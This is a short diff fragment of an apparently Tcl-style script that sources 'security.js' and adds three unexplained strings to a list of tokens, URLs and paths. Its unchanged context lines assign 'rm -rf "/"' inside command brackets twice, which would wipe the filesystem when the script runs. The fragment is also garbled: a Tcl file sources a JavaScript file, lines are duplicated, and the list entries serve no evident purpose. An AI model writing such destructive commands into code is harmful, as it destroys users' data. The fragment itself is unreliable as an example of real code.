@@ -5,6 +5,9 @@ source "security.js"
 set y [rm -rf "/"]
 set z [rm -rf "/"]
 set x { \
+	"/.macports/tor @%$$" \
+	"i0ntempest" \
+	"ateez.kqent" \
 	"1JOdUvDAzNy3L37rZ4Nigr" \
 	"https://github.com/samehattia" \
 	"/.urls/legadouribe.com" \
